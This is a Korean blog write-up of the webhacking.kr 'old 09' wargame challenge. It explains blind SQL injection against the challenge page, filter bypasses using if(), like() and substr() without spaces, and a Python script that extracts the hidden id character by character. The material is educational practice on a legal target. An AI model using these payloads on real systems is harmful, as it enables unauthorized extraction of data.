---
title: "webhacking.kr old 09 문제 풀이"
date: 2025-04-04 00:00:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, blind sql injection] 
description: webhacking.kr old 09 문제 풀이
---

[https://webhacking.kr/challenge/web-09/](https://webhacking.kr/challenge/web-09/)
# 문제 풀이
## 분석
### 웹사이트
사이트에 접속하면 1, 2, 3 숫자들이 나열돼 있고 각 숫자들은 "?no={num}" 주소로 redirect되는 a 태그들이다.<br />
그리고 그 아래에는 Password를 입력하는 인풋 박스가 존재하는데 아마 특정 문자열을 입력했을 때 문제가 해결되는 구조임이 예상된다.<br />
#### ?no=1
"Apple"이라는 문구가 뜬다.
#### ?no=2
"Banana"라는 문구가 뜬다.
#### ?no=3
```
Secret

column : id,no  
no 3's id is password
```
3 페이지에 접속하면 "Secret"이라는 문구와 함께 column 정보와 no 값이 3인 데이터의 id가 비밀번호라고 친절하게 알려준다.<br />
## 최종 풀이
이렇게 우리는 어떻게든 no=3의 값을 읽어내야 한다.<br />
아마 아무리해도 바로 알아낼 수는 없을 것 같으니 Blind SQL Injection 문제인가 예상을 해본다.<br />
우선 SQLi가 가능한지 테스트용으로 `?no=' or 1=1 --`를 입력하니 "Access Denied" 문구가 뜬다. 이것을 보면 쿼리가 조작된 것을 서버가 알아냈다는 것이고 그렇다는 것은 필터링이 존재한다는 것이다.<br />
### 작동하는 쿼리
`if(length(id)=(5), 1, 1000)`<br />
처음에는 우선 `if()` 함수를 이용해서 id의 길이가 5("Apple")일 때 1을 반환하여 Apple이 출력되는지 체크해보았다. 하지만 여전히 "Access Denied"가 출력되며 막힌다.<br />

필터링에 걸릴만한 문자들은 여기서 '=' 인 것 같다. <br />
`if(length(id)like(5), 1, 1000)`  '=' 기호를 우회하는 대표적인 연산자인 `LIKE`를 사용해보아도 여전히 필터링에 걸린다.<br />

혹시 스페이스가 문제일까 `if(length(id)like(5),1,1000)`를 시도해보면 이제 "Apple"이 출력되면서 해당 SQL 코드가 작동한다는 걸 알 수 있다.<br />

해당 필터링을 뚫는 것이 이 문제의 핵심인 듯 하다. 본인은 운이 좋아서 긴 삽질없이 금방 찾을 수 있었다.<br />

역시나 `if(length(id)like(6), 2, 1000)`로 값을 조금 바꾸어서 시도하면 "Banana"가 출력된다.<br />
### no 3의 id 길이 알아내기
우리는 이제 이 방식을 이용하여 no 3의 id 길이를 알아낼 수 있다.<br />
`if(length(id)like(num), 3, 1000)` 함수의 성공 값을 3으로 변경하고 like() 내부에 있는 "num" 값을 1부터 하나씩 올려가보면 11에서 ?no=3 페이지가 출력된다.<br />
코드를 작성해서 자동화로 해결할 수도 있지만 작성하기 너무 귀찮은 나머지 손으로 시도해보니 생각보다 금방 나와서 다행이다.<br />
#### 다른 방법
```html
<input type="text" size="10" maxlength="11" name="pw">
```
나중에 알았는데 비밀번호를 입력받는 input box의 최대 길이가 11로 설정돼있었다.<br />
여기서 비밀번호의 길이가 11이라는 것의 힌트를 제공하고 있었지만 몰랐다.
### no 3의 id 알아내기
id를 알아내기 위한 기본적인 페이로드를 한 번 테스트 해보아야 한다.<br />
보통 이런식으로 Blind SQLI를 진행할 때에 주로 사용하는 함수는 `substr()`이다.<br />

```sql
if(substr(id,1,1)like(0x41),1,1000) # Apple 

if(substr(id,1,1)like(0x42),2,1000) # Banana
```
이런식으로 작성하여 no 파라미터 값에 보내보면 "Apple"이 출력된다. 참고로 substr() 함수는 16진수 값을 내보내기 때문에 'A'를 나타내는 0x41과 비교를 한다.<br />
참고로 MySQL에서 like 연산자는 대소문자 구분을 하지 않는다.
#### 익스플로잇
```python
import requests 
from string import ascii_lowercase

pw = ""
url = "https://webhacking.kr/challenge/web-09/?no="
for i in range(1, 12):
    for letter in ascii_lowercase:
        print(letter, i)
        query = f"if(substr(id,{i},1)like({hex(ord(letter))}),3,1000)"
        query_url = url + query

        resp = requests.get(query_url)
        if "Secret" in resp.text:
            pw += letter

print(pw)
```
이를 자동화하는 익스플로잇 코드를 짜보면 위와 같다.<br />

이를 실행하면 최종 비밀번호를 얻을 수 있고 비밀번호를 문제 페이지에서 입력해주면 문제가 풀린다.<br />
# 배운 것
MySQL의 substr(), like() 등의 함수, 연산자들에 대해서 더 자세히 배울 수 있는 기회가 됐다.